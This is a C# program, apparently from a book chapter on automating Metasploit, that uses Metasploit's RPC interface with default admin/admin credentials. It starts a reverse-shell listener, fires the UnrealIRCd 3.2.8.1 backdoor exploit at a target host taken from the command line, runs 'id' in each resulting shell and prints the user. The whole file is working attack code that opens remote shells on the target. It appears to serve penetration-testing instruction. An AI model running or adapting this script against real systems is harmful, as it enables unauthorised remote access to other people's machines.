﻿using System;
using System.Collections.Generic;
using MsgPack;
using System.Collections;

namespace ch13_automating_metasploit
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			string listenAddr = args[1];
			int listenPort = 4444;
			string payload = "cmd/unix/reverse";

			using (MetasploitSession session = new MetasploitSession ("admin", "admin", "http://"+listenAddr+":55553/api")) {
				if (string.IsNullOrEmpty (session.Token))
					throw new Exception ("Login failed. Check credentials");
				using (MetasploitManager manager = new MetasploitManager (session)) {
					Dictionary<object, object> response = null;

					Dictionary<object, object> blah = new Dictionary<object, object> ();
					blah ["ExitOnSession"] = false;
					blah ["PAYLOAD"] = payload;
					blah ["LHOST"] = listenAddr;
					blah ["LPORT"] = listenPort;

					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
					object jobID = response ["job_id"];

					Dictionary<object, object> opts = new Dictionary<object, object> ();
					opts ["RHOST"] = args[0];
					opts ["DisablePayloadHandler"] = true;
					opts ["LHOST"] = listenAddr;
					opts ["LPORT"] = listenPort;
					opts ["PAYLOAD"] = payload;

					manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);

					response = manager.ListJobs ();
					while (response.ContainsValue ("Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
						Console.WriteLine ("Waiting");
						System.Threading.Thread.Sleep (10000);
						response = manager.ListJobs ();
					}

					response = manager.StopJob (jobID.ToString ());

					response = manager.ListSessions ();
					foreach (var pair in response) {
						string id = pair.Key.ToString();
						manager.WriteToSessionShell (id, "id\n");
						System.Threading.Thread.Sleep (1000);
						response = manager.ReadSessionShell (id);
						Console.WriteLine ("We are user: " + response ["data"]);
						Console.WriteLine ("Killing session: " + id);
						manager.StopSession (id);
					}
				}
			}
		}
	}
}
